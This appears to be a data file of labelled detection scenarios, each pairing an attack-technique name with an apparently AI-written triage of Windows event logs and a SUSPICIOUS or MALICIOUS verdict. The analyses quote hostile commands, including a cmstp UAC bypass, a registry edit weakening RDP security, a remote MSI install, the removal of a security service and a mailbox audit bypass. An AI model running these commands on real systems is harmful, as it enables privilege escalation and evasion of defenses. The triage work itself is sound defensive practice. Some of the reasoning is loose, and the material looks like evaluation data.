- Numerous executions of MicrosoftEdgeUpdate-related processes in different directories, potentially hiding suspicious activities.

**Resolution: SUSPICIOUS**

**Recommendations for Further Investigation:**
- Review related network traffic logs to verify any unusual or unauthorized external data transfers, especially around the time of the activity.
- Verify with system administrators if the activities, particularly any external data fetches and `wevtutil.exe` operations, were authorized or expected.
- Conduct memory and forensic analysis on the system to detect any hidden or unauthorized software execution.
- Check endpoint protection logs and scan the system for malware, focusing on known indicators related to command-line abuse and Edge Update service misuse."
Bypass UAC using sdclt DelegateExecute,"After examining the provided Windows event logs from the Security, Application, System, Windows PowerShell, and Sysmon channels, I have identified the following key observations:

1. **Security Log Events (EventID 4624, 4672)**:
   - EventID 4624 indicates a successful system logon (Logon Type 5, meaning a service logon). This itself is not inherently suspicious.
   - EventID 4672 shows that the user ""SYSTEM"" was granted special privileges, including significant rights such as `SeDebugPrivilege`. This might be benign based on standard operating system operations, but it requires context to fully assess.

2. **Windows PowerShell Log**:
   - There's a notable sequence involving PowerShell commands that manipulate the Registry to change shell open command actions, possibly a technique for persistence or privilege escalation. The command line indicates changes to `HKCU:\\Software\\Classes\\Folder\\shell\\open\\command`, setting it to execute `cmd.exe /c notepad.exe`, and using `sdclt.exe`, which is known to be used in UAC bypass techniques. This behavior is highly suspicious and indicative of potential malicious activity, as it suggests an attempt to manipulate system behavior.

3. **Sysmon Log**:
   - Numerous executions of command-line utilities like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` by the user `admin_test`. While the usage of these utilities could be legitimate depending on the user's actions or scripts, their occurrence in succession could suggest either legitimate system management scripts or potential reconnaissance activities.
   - The execution of `powershell.exe` with a parameter intended to create suspicious registry keys further emphasizes that the observed behavior is not purely benign. This strongly aligns with malicious action aimed at elevating privileges or establishing persistence.

4. **Application Log**:
   - Windows Defender is shown as active and on, which is good from a defense perspective but doesn’t negate the presence of malicious activities.

5. **System Log**:
   - Time synchronization events and general kernel operations appear standard and do not show immediate indicators of tampering or compromise by themselves.

### Conclusion:
- **Resolution: MALICIOUS**
  - The PowerShell log entries combined with the suspicious registry operations and use of administrative privileges point strongly towards attempted privilege escalation and potential persistence mechanisms. These activities, especially the modification of user shell behavior through the registry, are common in malware and unauthorized access.

### Guidance:
- Immediately review user activity for the account `admin_test` to determine if the actions were authorized.
- Perform a deep scan of the system with updated security tools to identify any dormant or active threats.
- Check for known vulnerabilities in `sdclt.exe` usage and apply relevant patches.
- Investigate further network activity from the time of these logs to see if lateral movement or data exfiltration occurred.
- Consider monitoring registry changes and excessive PowerShell usage as part of enhanced logging and alerting policies."
MSXSL Bypass using local files,"The logs provided contain various events recorded by Windows on the system ""Server002."" After meticulous examination, here's an assessment based on the provided logs:

### Analysis of Logs

#### Security Log:

- **EventID 4624 and 4672**: These events signify successful logons and the use of special privileges. The process ""C:\\Windows\\System32\\services.exe"" with Logon Type 5 indicates a service startup. The privileges include powerful rights such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, which might be misused if exploited. However, these events alone are typical for system processes under `NT AUTHORITY\SYSTEM`.

- **EventID 5379**: These occur multiple times and are associated with failed operations. The `ReturnCode` of `3221226021` indicates a ""Context Expired"" error, which often surfaces due to failed authentication processes or expired sessions. The significance depends on the context but may suggest repeated credential or session attempts, yet the logs don't provide enough context for malicious activity.

- **EventID 4798**: These entries suggest queries on local group memberships, potentially associated with administrative tasks or system checks, performed by `taskhostw.exe`.

#### Sysmon Log:

- **PowerShell Execution**: The presence of `powershell.exe` being executed by `SERVER002\admin_test` could raise suspicion, especially without clear intent or documentation confirming the execution is authorized. PowerShell is often associated with both legitimate administrative activity and malicious scripts.

- **Conhost and Wevtutil**: These two processes run consecutively, conhost is a console window host process, whereas wevtutil is used for managing Windows Event Logs. Their execution suggests the interaction with or querying of logs, potentially for information gathering or log tampering.

- **Cmd.exe and msxsl.exe**: The presence of `cmd.exe` executing with a command line involving `msxsl.exe`, known for XML file transformations using XSLT, could be benign if part of a normal operation or a scripting routine. However, unusual scripting activity or transformations with external files could indicate an attempt to use msxsl for script execution bypassing typical script execution policies.

- **Process IDs and Execution Paths**: Most other processes and commands, like `CompatTelRunner.exe`, `DeviceCensus.exe`, `MusNotification.exe`, and `Microsoft Edge Update` processes, seem to be associated with standard telemetry, compatibility, and update-checking tasks that run under NT AUTHORITY\SYSTEM, indicative of normal scheduled operations.

#### Summary:

While individual events could potentially be found in a compromised scenario (like unauthorized PowerShell or cmd.exe usage), consistent evidence of a coordinated malicious attack or behavioral anomalies indicating certain compromise was not conclusively present in the logs examined. 

### Conclusion

**Resolution**: **SUSPICIOUS**

Given the execution of PowerShell without explicit context and multiple failed credential operations (EventID 5379), the activity remains suspicious and warrants further investigation. Particularly, check for any anomalies in script execution or unauthorized access attempts correlating with these logs.

### Recommendations:

1. **Verify PowerShell Usage**: Ensure that all PowerShell scripts executed have a known and authorized source. Evaluate associated command lines for suspicious script names or execution arguments.

2. **Audit Privilege Use**: Regularly audit any system activities that require elevated privileges, especially those granted by the `SeDebugPrivilege`, to ensure they are warranted and secure.

3. **Monitor Log Tampering**: Focus on events involving `wevtutil.exe` for potential unauthorized log clearing or querying, particularly if used by non-administrative accounts or processes not typically interacting with logs.

4. **Network Activity Correlation**: Cross-reference logs with network traffic to identify possible data exfiltration, command-and-control signals, or other deviations in network patterns.

These actions should help determine whether the suspicious behavior observed could be attributed to legitimate administrative tasks or indicative of a potential security incident."
CMSTP Executing UAC Bypass,"Based on the analysis of the provided logs, here are the key findings:

1. **Suspicious Process Executions**:
   - The logs show that the user `admin_test` executed `cmd.exe` with the command line argument to run `cmstp.exe` with the `/au` option, which is commonly used for User Account Control (UAC) bypass. The specific command executed was: `""cmd.exe"" /c cmstp.exe /s ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003_uacbypass.inf"" /au`. This indicates an attempt to elevate privileges without user interaction, which is suspicious and often seen in malicious activities.
   
2. **Weird Command Line Arguments**:
   - The `conhost.exe` processes were spawned alongside suspicious activities, which were executed as child processes of the UAC bypass command.
   - Another noticeable execution was the `wevtutil.exe`, which can be used to manage event logs, possibly to clear logs. This activity occurred around the same time as the suspicious `cmstp.exe` activity.

3. **Logs of Security Privilege**:
   - Security logs captured multiple instances of `admin_test` being assigned privileges such as `SeDebugPrivilege`, `SeRestorePrivilege`, and others. While these could be normal for an admin account, their timing correlates with the suspicious process executions mentioned earlier.

4. **Multiple Use of EdgeUpdate**:
   - There are multiple instances of `MicrosoftEdgeUpdate.exe` doing installations and running setup. This alone may not be indicative of compromise but its frequent occurrence could mask or be used in tandem with suspicious activities if the process is exploited. However, these seem routine and benign given the context.

5. **Logons**:
   - There were logon attempts by the `admin_test` account via NTLM, which could be legitimate or part of account enumeration attempts. The IP addresses (IPv6) logged denote local loopback activities or misconfigured network settings rather than external intrusion.

In conclusion, based on the execution of commands aimed at UAC bypass, security log entries concerning high privileges, and the correlation of these events within a short timespan, the findings lean towards suspicious activities that require further investigation.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed**:
- Conduct a deeper forensic analysis to determine the source and intent behind the UAC bypass attempt.
- Review user `admin_test` activities and confirm if they align with organizational policies.
- Inspect the integrity of the system for other signs of malicious activity.
- Review recent updates on Microsoft Edge to ensure they are legitimate and not exploited.
- Strengthen monitoring and implement alerts for similar activities around privileged command executions."
Remove Network Share PowerShell,"### Analysis of Windows Event Logs

The logs provided cover system, application, sysmon, PowerShell, and security activities on a Windows machine (specifically, Server002) on the date 2024-10-23. The following analysis examines potential indicators of malicious activity or compromise in these logs.

#### 1. **System Log:**
- **Time Change Events (EventID 1):**
  - This event logs a change in system time, facilitated by the `svchost.exe` process. This could suggest legitimate time sync activities, especially since time.windows.com is used, which is a standard time source. However, system time changes can also be a tactic by attackers to evade detection mechanisms.
  
#### 2. **Application Log:**
- **Edge Update Events:**
  - The logs indicate Edge update service stopping and starting. This is typical behavior during a software update and appears benign as Edge is a legitimate application by Microsoft.

#### 3. **Sysmon Log:**
- **Wevtutil and Conhost Usage:**
  - Multiple invocations of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test` are recorded. `wevtutil` is used for managing Windows event logs, and frequent usage could indicate log manipulation efforts, potentially by an attacker.
  
- **PowerShell Execution (EventID 1):**
  - The execution of PowerShell with `Remove-SmbShare` and `Remove-FileShare` commands is suspicious. PowerShell is often used by attackers due to its powerful scripting capabilities. The specific use of these commandlets suggests attempts to manipulate network shares, which is unusual unless performed by an admin under legitimate maintenance.
  
#### 4. **PowerShell Log:**
- **Commands Removal and Execution:**
  - The commands executed to remove SMB shares could imply a potential attempt to cover tracks by eliminating unauthorized shares or connections.

#### 5. **Security Log:**
- **Time Change Logging:**
  - Security log entries corroborate time change events by showing changes in system time. Legitimate time adjustments are usually infrequent outside standard maintenance windows.

### Conclusion and Resolution

1. **Benign Indicators:**
   - The Edge update activities reflect standard and legitimate software updates.

2. **Suspicious Indicators:**
   - Repeated use of `wevtutil` by an administrative account could indicate event log manipulation.
   - PowerShell activity involving removal of SMB shares is suspicious, especially without clear operational context.

3. **Malicious Indicators:**
   - No conclusive evidence of malicious intent that can confirm a compromise without additional context or investigation into the admin activities logged. The actions logged could be either legitimate administrative actions or suspicious activity indicative of a threat.

### Resolution: **SUSPICIOUS**

The activities observed—specifically the use of PowerShell to remove SMB shares and the repetitive use of `wevtutil`—are suspicious and warrant further investigation. It is crucial to verify whether these actions were part of scheduled administrative tasks or if they may suggest unauthorized actions indicative of a compromise. Further inquiries should focus on:
- Cross-verifying these actions with known administrative tasks.
- Examining access logs and user activity around the same time frame for anomalous access.
- Engaging with the user `SERVER002\admin_test` to understand the context of their operations.

If unauthorized use is confirmed, a thorough forensic analysis should be conducted to determine the scope of access and any potential data exfiltration or system manipulation."
Stop and Remove Arbitrary Security Windows Service,"Upon analyzing the provided Windows event logs from various sources (Application, Security, System, Sysmon, and Windows PowerShell logs), the following points stand out:

1. **Security Log Analysis**
   - Event ID 4624 and 4672 log entries are observed, indicating a successful logon event and administrative rights assignment, respectively. These events are typical in Windows environments but merit investigation if they occur at unusual hours or by unexpected accounts. In this case, the logon type, user, and domain suggest typical system operations.

2. **Sysmon Log Analysis**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` execution by the user `SERVER002\admin_test` are logged. `wevtutil.exe` is used for managing event logs and is not inherently suspicious; however, frequent executions should be scrutinized to ensure they align with legitimate administrative tasks.
   - Critical entry: A PowerShell command used to stop and remove `McAfeeDLPAgentService` is logged. This could indicate an attempt to disable security protections and is unexpected behavior that demands further investigation.

3. **Windows PowerShell Log Analysis**
   - The PowerShell command execution `Stop-Service -Name McAfeeDLPAgentService` and `Remove-Service -Name McAfeeDLPAgentService` indicates a possible attempt to stop and remove a security service. This action is likely unauthorized, suspicious, and typically associated with anti-forensic activities or preparations before launching an attack.

4. **System and Application Log Analysis**
   - Regular system and application updates through Microsoft Edge and system processes do not show any immediate signs of tampering or suspicious behavior beyond those already highlighted.
   - Time changes in logs, caused by ordinary system processes like `svchost.exe`, do not suggest manipulation and are consistent with time service and update activities.

**Assessment & Conclusion**
- The logs exhibit unusual and potentially unauthorized PowerShell activity involving disabling security software (McAfee DLP agent), which is a strong indicator of potentially malicious activity.

**Guidance**
1. **Immediate Action**: Isolate the affected system to prevent potential lateral movement or further compromise.
2. **Investigation**: Perform further investigation on the user account `admin_test` and any recent script or file changes associated with the PowerShell execution.
3. **Review Security Policies**: Review access policies and ensure antivirus and endpoint protection software configurations can prevent unauthorized changes.
4. **Incident Response**: Begin incident response procedures as the logs suggest activities aligning with indicators of compromise.

**Final Resolution: MALICIOUS**"
Activate Windows NoSetTaskbar Group Policy Feature,"Upon reviewing the provided logs, here is a detailed analysis of the entries:

### Security Log
- The log displays entries for the event ID 4616 which indicate a system time change being processed by `svchost.exe` running under the `NT AUTHORITY\LOCAL SERVICE`. This can be a routine action as part of time synchronization activities on a Windows system, especially when managed by a domain controller. There is no immediate indication of malicious activity related to these logs.

### Application Log
- Observations of the `Software Protection Platform Service` and `edgeupdate` events are typical for system maintenance tasks. The `edgeupdate` service events reflect the start and stop of a Microsoft Edge update service, which appears to be scheduled and automated based on Microsoft practices.

### Sysmon Log
- A series of events pertain to `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `reg.exe`, and `whoami.exe` being executed by the user `SERVER002\admin_test`. The main point of interest is the `cmd.exe` command with `/c reg add` arguments:
  - **CommandLine:** `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoSetTaskbar /t REG_DWORD /d 1 /f`  
  - This command alters the Windows Registry to modify taskbar behavior. While registry modifications are common during legitimate administrative actions, executing registry changes could also indicate a script or attacker attempting to change system settings, potentially leading to unauthorized configuration changes.

### Risk Assessment
- **Registry Modification:** The use of `cmd.exe` to perform registry alterations by a standard user could be suspicious if it wasn't authorized. Unauthorized changes to the system registry could lead to malware persistence or other changes that obfuscate system state.
- **Use of `wevtutil.exe` and `whoami.exe`:** Actions such as querying or clearing events logs could be indicative of someone trying to cover their tracks if this was not part of regular maintenance or scripting.
  
### System Log
- The observed time change events align with typical network time synchronization and do not immediately suggest malicious activity on their own.

### Conclusion
- **Resolution: SUSPICIOUS**

While there's no definitive evidence of compromise or malicious behavior, the invocation of registry modifications using `cmd.exe` warrants additional investigation to verify it was authorized and expected. Further examination or correlation with user activity around the time of these events should be conducted. It might be necessary to follow up with the user `admin_test` for clarification on the purpose of these registry changes or check for any related alerts from endpoint protection systems."
Indicator Manipulation using FSUtil,"### Detailed Analysis of Log Entries

#### 1. **General Observations:**

- The logs reveal operations conducted on a Windows Server machine identified as ""SERVER002"".
- A user identified as `admin_test` is frequently seen executing commands and has been associated with a high integrity level across multiple logged events.

#### 2. **Identified Anomalous Behavior:**

- **Event ID 4616 (Security Log)**: 
  - The time is set back by 5 seconds, with `svchost.exe` as the responsible process. This anomaly can potentially indicate an attempt to manipulate system time for log evasion or bypassing time-based restrictions.

- **Event ID 4624 & 4634 (Security Log)**:
  - LogonType 3 indicates network logon, suggesting remote access by the `admin_test` user from `DESKTOP-3HL5B2P`. This could merely indicate remote administration but done at a high volume and frequency may imply malicious intentions.

- **Event ID 4672 (Security Log)**: 
  - `admin_test` user was granted a wide array of privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are powerful system-level permissions that could potentially be exploited if in the wrong hands.

#### 3. **Specific Indicators of Malicious Activity:**

- **Windows PowerShell Logs:**
  - Execution of PowerShell with a command line involving creating a text file and zeroing its content raises suspicion. Operations with `fsutil` to modify file data are a common method to alter, obscure, or prepare files for malicious intents.
  
- **Sysmon Log:**
  - Frequent creation and usage of processes like `powershell.exe` and `fsutil.exe`, possibly forming a pattern known in file manipulation and system abuse.

- **Elevated and High Integrity Level Processes:**
  - Admin level accesses are commonplace when performing legitimate tasks, but continuous high-level operations without apparent administrative necessity can indicate potential nefarious behavior.

#### 4. **Potential Threats and Risks:**

- The combination of multiple administrative actions without immediate necessity, especially those operating at the system level, can suggest attempted privilege escalation or preparation for unauthorized data movements or alterations.
- Suspicious PowerShell command execution, particularly one altering data, might indicate attempts to conceal traces or facilitate further undetected breaches.

### Conclusion and Resolution:

Upon reviewing the log entries provided, the activity observed is deemed **SUSPICIOUS**. The persistent use of elevated privileges by `admin_test`, along with unusual modifications using PowerShell and fsutil, necessitates further investigation. Moreover, time alteration activities underline an immediate need for closer examination to ensure integrity and security within the network.

### Guidance on How to Proceed:

1. **Immediate Monitoring**: Increase surveillance on user `admin_test` and restrict privileges if needed until investigation completion.
2. **Audit and Validate**: Validate the purpose and necessity of each administrative action logged. Confirm legitimacy with the `admin_test` user or related parties.
3. **System Check**: Perform system integrity checks specifically targeting unexplained file or system modifications.
4. **Review Remote Access Policies**: Consider revising remote access mechanisms if unexplained or unauthorized access is found to be a factor.
5. **Incident Response Preparation**: Have the incident response team ready to delve into additional areas and logs not covered here to confirm or eliminate the suspicion of ongoing malicious activity."
Msiexec.exe - Execute Remote MSI file,"Upon reviewing the provided logs, several events stand out as potentially indicative of malicious activity:

1. **Unusual Use of msiexec.exe:**
   - **Sysmon EventID 1 & 5:** There is a command executed by `cmd.exe` using `msiexec.exe` to install an MSI package from a remote URL (`https://github.com/file/file-file/raw/master/files/data.007/bin/data.007_JScript.msi`). This behavior is suspicious, as MSI is commonly used by attackers to deploy malicious payloads.
   - **Application Log:** There are events showing the installation of the ""file file Test Installer,"" which matches the suspicious URL in the Sysmon log. The installation completes successfully. 

2. **PowerShell Execution:**
   - **Sysmon EventID 1 & 5:** Shows the execution of `powershell.exe` with the `-nop` (no profile) and `-Command` flags, which can be used to bypass security mechanisms and execute scripts stealthily. The command `Write-Host JScript executed me!; exit` seems like a marker or debug statement indicating the execution of a JScript file.
   - **PowerShell Logs:** Confirm the execution of the PowerShell process with the command `Write-Host JScript executed me!; exit`, aligning with the suspicious Sysmon entry.

3. **Process Parentage and Execution:**
   - WSMPRovHost as the parent process of `cmd.exe` and PowerShell activities could imply remote management or automated task sequences, which should be scrutinized if unexpected.

4. **High Integrity Level and Execution Context:**
   - Several processes run with High Integrity, under the user `SERVER002\admin_test`. This highlights that these processes are running with elevated privileges, increasing the risk and impact of their actions.

### Assessment:

Based on these observations, the behavior captured in the logs is strongly indicative of a compromise:
- The execution of `msiexec.exe` from a remote URL suggests an attempted or active payload delivery.
- The PowerShell execution with parameters seen here is a tactic frequently used in obfuscated or stealthy scripts.
- The unusual combination of process parentage and elevated execution context elevates the risk of this being unauthorized or malicious behavior.

### Resolution: MALICIOUS

Given the clear indications of potentially harmful activity, this incident should be classified as **MALICIOUS**. Immediate steps should include:
- Isolating the affected machine from the network to prevent further spread or damage.
- Conducting a thorough forensic analysis on the system to determine the full scope and potential impact.
- Reviewing the administrative credentials used (`admin_test`) for unauthorized access or misuse.
- Reinforcing security policies to prevent similar methods of attack, including restricting the use of msiexec from remote sources.

These actions will help to contain the threat and mitigate any damage while identifying preventative measures to strengthen overall system security."
Hidden Window,"### Log Analysis and Preliminary Assessment

**1. Security Log:**
- **EventID 4616**: This log represents a change in the system time which can potentially be suspicious if unauthorized, but there is no indication of such manipulation. The responsible process is `svchost.exe` running under `LOCAL SERVICE`, which is typical for system tasks.

**2. Windows PowerShell Log:**
- The PowerShell events reveal the execution of what appears to be a command that attempts to run PowerShell in a hidden window and start `calc.exe`.
  - **HostApplication**: `powershell.exe & {Start-Process powershell.exe -WindowStyle hidden calc.exe}` 
  - This behavior can be indicative of an attempt to execute commands stealthily without user visibility, potentially a tactic used in malicious scripts or attacks.

**3. Sysmon Log:**
- Numerous executions of system utilities such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and notably multiple PowerShell instances executing similar commands to those found in the PowerShell logs:
  - **CommandLine**: `""powershell.exe"" & {Start-Process powershell.exe -WindowStyle hidden calc.exe}`
  - The presence of `calc.exe` appearing under a PowerShell parent process with hidden execution flags further corroborates the potentially suspicious behavior first seen in the PowerShell logs.

**4. System Log:**
- The system log captures routine kernel and time service events, aligning with the activities seen in the security log regarding time setting adjustments. There is no immediate indication of these logs linking to the suspicious behavior seen elsewhere.

**5. Application Log:**
- Single log entry related to the Software Protection Platform Service appears benign and routine without evidence of linked malicious activity.

### Assessment
The recurring execution of PowerShell with a command to launch processes hidden (even if seemingly benign like `calc.exe`) is a notable red flag. This pattern is often associated with scripting attacks or unauthorized automation attempts where malicious payloads are attempted to be delivered discreetly, making this activity **suspicious**.

### Resolution
**Resolution: SUSPICIOUS**

The indicators of hidden PowerShell execution, particularly used in potentially unauthorized or suspicious contexts, necessitate further investigation. While `calc.exe` itself is not harmful, the method of execution using hidden window styles and repetition suggests that this could be a test or part of a malicious script.

### Guidance and Next Steps
1. **Isolate the Host**: Isolate the system to prevent potential lateral movement across the network.
2. **Further Forensic Analysis**: Conduct a deeper forensic investigation on the machine, focusing on PowerShell execution logs and related script blocks.
3. **Review User Activity**: Understand who executed these commands and whether their actions align with expected tasks.
4. **Increase Monitoring**: Implement enhanced logging and monitoring, looking for similar PowerShell activities across the environment.
5. **Security Awareness**: Conduct training for users about recognizing suspicious scripts or unexpected applications launching.
6. **Patch and Update**: Ensure that all systems are patched and updated to mitigate common vulnerabilities that could be exploited through PowerShell misuse.

Conclusively, while the `calc.exe` executions themselves were not malicious, the method and repetition of PowerShell usage in a hidden fashion warrant a careful examination to verify the intent and rule out hidden threats."
Office 365 - Set Audit Bypass For a Mailbox,"Upon reviewing the provided logs, here is the detailed analysis:

### Suspicious or Anomalous Behavior:
1. **PowerShell Execution with Critical Command:**
    - The command `""powershell.exe"" & {$secure_pwd = \""o365_password_test\"" | ConvertTo-SecureString -AsPlainText -Force, $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \""o365_user_test\"", $secure_pwd, Connect-ExchangeOnline -Credential $creds, Set-MailboxAuditBypassAssociation -Identity \""o365_email_test\"" -AuditBypassEnabled $true}` is highly suspicious.
    - It suggests the script is converting a plaintext password into a secure string, creating credentials, and attempting to connect to Exchange Online with those credentials.
    - The command `Set-MailboxAuditBypassAssociation -Identity \""o365_email_test\"" -AuditBypassEnabled $true` is critical as it implies modifying audit settings to bypass logging, often a behavior associated with malicious activities to evade detection.

2. **Execution of Sysmon Events:**
    - Multiple Sysmon logs show PowerShell, conhost.exe, and wevtutil.exe processes being executed in quick succession. While these may not inherently indicate malicious activity, the use of PowerShell with a critical command raises concerns.
    - The processes are executed by the user `SERVER002\\admin_test`, suggesting administrator privileges are being used for these operations.

3. **Elevated Context & Use of Credentialed Operations:**
    - The Powershell command is executed in a high integrity level context, often pointing towards actions requiring administrative privileges.
    - The settings and execution policy used to run the scripts do not adhere to organizational security policies or best practices.

### Events Indicating Malicious Activity or Compromise:
- The specific PowerShell activity involving credential creation and modifying mailbox audit settings implies a targeted attempt to manipulate or access system logging policies for an email account, which can be an indicator of a more extensive system compromise or a specific malicious intent to evade detection while accessing or modifying sensitive information.

### Threats and Risks Identified:
- Unauthorized access or modification to mailbox audit settings could allow malicious actors to perform actions undetected, posing a significant risk to data integrity and security.
- The use of sensitive commands in PowerShell to alter audit settings while leveraging potential admin privileges denotes a risk of privilege escalation and unauthorized access.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Investigate the source and legitimacy of the `o365_user_test` account and its associated activities.
   - Verify whether the PowerShell scripts were intended for legitimate administrative purposes or if they indicate unauthorized access attempts.
   
2. **Mitigations:**
   - Change credentials that may have been compromised and enforce stricter access management controls, particularly on accounts with admin privileges.
   - Monitor and audit related email accounts and mailbox activities for any unauthorized access.

3. **Long-term Strategy:**
   - Implement enhanced monitoring and alerting on PowerShell execution, especially those modifying audit configurations.
   - Review and tighten execution policies and enforce code signing for scripts running on sensitive systems.

**Conclusion**: Based on the analysis of the logs, the case should be classified as **""MALICIOUS""**. The activities observed are consistent with attempts to circumvent auditing processes, possibly to allow undetected access or actions within the system. Immediate investigation and remediation actions are recommended to mitigate the potential risk."
Enabling Remote Desktop Protocol via Remote Registry,"Upon analyzing the provided Windows event logs, here is a detailed assessment of the observed activity and any indicators of potential compromise:

### Key Observations:

1. **Frequent Execution of `wevtutil.exe`:**
   - We see multiple instances of `C:\Windows\System32\wevtutil.exe` being executed by the user `SERVER002\admin_test`. The `wevtutil.exe` tool is used for managing Windows Event Logs, which includes querying, exporting, archiving, and clearing logs.
   - The frequency and repeated execution of this utility within a short time span could indicate log tampering or an attempt to cover tracks.

2. **Registry Modification with `cmd.exe` and `reg.exe`:**
   - There is a notable execution of `cmd.exe`, which includes a registered command to modify the Windows Registry: 
     ```
     ""cmd.exe"" /c reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 0 /f
     ```
   - The command executed is used to modify Remote Desktop Protocol (RDP) settings, specifically reducing the Security Layer of RDP to 0, which can potentially weaken security configurations, making it susceptible to exploitation.

3. **Execution of `whoami.exe` and Process Monitoring:**
   - The `whoami.exe` tool for checking user information was executed, typically used for verifying the current user's privileges.
   - Frequent execution of basic command tools like `hostname.exe` and `whoami.exe` in conjunction with registry modifications could suggest reconnaissance or preparation steps by an attacker.

4. **General Execution of System Utilities:**
   - Also observed is the execution of other utility programs such as `conhost.exe`, which is a legitimate Windows component but can be used to operate in the background for malicious purposes when paired with suspicious commands.

### Assessment:

The combination of registry modification to weaken RDP security, frequent execution of `wevtutil.exe` for managing event logs, and use of utilities like `whoami.exe` for potentially reviewing user privileges strongly indicates the possibility of unauthorized activities aiming for system exploitation or privilege escalation. 

### Conclusion:

Given the suspicious behavior demonstrated by the registry modifications, log utility manipulations, and the timing of these operations without further context, this activity should be categorized as:

- **SUSPICIOUS** - These logs contain behaviors that suggest potential malicious activities and warrant further comprehensive investigation to determine any unauthorized access or intentions for network compromise.

### Guidance:

1. **Immediate Review:** 
   - Conduct a thorough review of RDP configurations and network access logs to identify any unauthorized network access.
   - Investigate user `admin_test` for any activities that align with unauthorized modifications or suspicious logins.

2. **Event Log Analysis:**
   - Analyze historical event logs pre-dating these entries to understand any escalation or pattern of unauthorized activities by this user or related user IDs.

3. **Security Audit:**
   - Perform a system health check to audit registry changes and confirm system integrity settings, especially around RDP configurations.
   - Engage in real-time monitoring and establish alerts for continued registry modifications and sensitive tool executions (e.g., `wevtutil.exe`, `cmd.exe`).

4. **User Education:**
   - If deemed non-malicious, consider reinforcing user training to avoid unsafe practices and ensure only necessary privilege use.

This captures the current risk observation and necessary next steps to address the potential threat scenario effectively."
Create Windows System File with Attrib,"Upon analysis of the provided logs, I have observed the following:

1. **Security Logs**: 
   - Event ID 4616 indicates changes to the system time, which could be normal behavior, but frequent or unauthorized changes can be suspicious. In this case, there are no clear indications that this is tied to malicious activity.

2. **Application Logs**:
   - Events regarding ""edgeupdate"" indicate the stopping of a service, typical during updates or patches. There is no clear sign of this activity being related to a threat.

3. **Sysmon Logs**:
   - The execution of `cmd.exe` with commands to check the existence of files and modify file attributes is noteworthy. Commands such as `IF EXIST %%temp%%\data.001.txt ( EXIT 0 ) ELSE ( EXIT 1 )` and `attrib.exe +s %%temp%%\data.001.txt` may sometimes be used as part of an exploit or automated script to maintain persistence or gather data covertly.
   - Multiple instances of programs like `wevtutil.exe`, `cmd.exe`, `conhost.exe` running in conjunction could be part of normal operations or system administration tasks, but could also suggest malicious scripting.
   - The presence of `wevtutil.exe` is notable; this utility is often used for managing and interacting with event logs. Its repeated use can suggest an attempt to clear logs to hide tracks, but there's no direct evidence of log clearing commands found here.
   - Microsoft Edge Update operations are logged, indicating potential update routines with `MicrosoftEdgeUpdate.exe`. The update process and related activities appear consistent with legitimate software update mechanisms and do not immediately suggest malicious activity.
   - Commands like `whoami.exe` and `hostname.exe` are commonly used for identifying the user and system, which can be normal in scripts or automated routines.

**Assessment**:
- **BENIGN**: The majority of activity appears consistent with legitimate system updates (e.g., Microsoft Edge), system administration tasks, and system processes.
- **SUSPICIOUS**: However, the scripted changes of file attributes and multiple cmd usages with file checks, alongside frequent changes to the system time, could warrant a review to ensure that no automation tasks or scripts are being used maliciously.
- **MALICIOUS**: There is insufficient evidence to claim that these logs are clearly tied to malware or active compromise.

**Resolution**: **SUSPICIOUS**

**Guidance**:
1. Conduct further investigation to ensure there are no unauthorized scripts or automation tasks running on the system.
2. Verify that the changes to file permissions and attributes are expected and authorized as part of regular administrative tasks.
3. Check for any recent software installations or updates that may have led to changes in behavior, focusing on potentially suspicious patterns.
4. Monitor and review similar logs going forward to detect any patterns that could indicate attempts to disguise or clear malicious activity."
Invoke CHM with InfoTech Storage Protocol Handler,"## Analysis of Log Entries

### Windows PowerShell Log

The PowerShell logs show a batch of events initiated by an administrative user (`admin_test`) on `Server002`. These events involve execution of a script using `Invoke-ATHCompiledHelp` with PowerShell. The command executed is:
```powershell
powershell.exe & {Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm}
```
This type of command, executing a script with a relatively unfamiliar cmdlet (`Invoke-ATHCompiledHelp`), could indicate suspicious activity, primarily if this cmdlet or script is not part of routine operations.

### Sysmon Log

The Sysmon logs provide detailed information about process creation and termination, primarily:
- Powershell.exe execution alongside Conhost.exe processes.
- We see several executions of `wevtutil.exe`, a command-line utility to retrieve information about event logs and publishers. While this by itself can be benign, if used in conjunction with other processes, it may indicate that someone is extracting event logs for analysis or covering tracks.
- Execution of `whoami.exe` and `hostname.exe`, while common for gathering system info, seeing this can indicate a possible reconnaissance step if coupled with unusual script execution.

The parent-child relationship between processes implicating `wsmprovhost.exe` as the parent also suggests activity related to Windows Remote Management, potentially normal but depends on the context of where and why these logging activities occur.

### Security Log

- The security logs recorded a logon event (ID 4624) for the SYSTEM account, indicating service-related activity.
- Privilege assignment (ID 4672) for SYSTEM is recorded, detailing high privileges, including SeDebugPrivilege, which allows for bypassing certain access controls. This is typical for SYSTEM but worth noting if coupled with other indicators of compromise.

### System Log

- Numerous entries are related to Windows Update checks, indicating routine updating activity. None of the update processes appear to have unusual details or times that would suggest suspicious activity.

### Summary

- The persistent execution of PowerShell scripts with non-standard invocation (`Invoke-ATHCompiledHelp`) in the logs, especially when executed by an administrative account, appears suspicious. The high frequency of PowerShell activities around the same time frame further strengthens the suspicion.
- Coupled with `wevtutil.exe`, it suggests potential unauthorized access or activity aiming to modify/log system events or obscure access/activity logs.
- The lack of direct evidence of a benign task or routine maintenance forces the categorization of the observed activity as more than simple routine operations.

## Resolution

Based on the analysis of the logs, the classification of the situation at this point is:
- **SUSPICIOUS** - The PowerShell activity does not align with typical system operations, involves scripts not standard for administrative routines, and potentially indicates unauthorized access or preparatory actions for a compromise. Further investigation is warranted to rule out malicious intent."
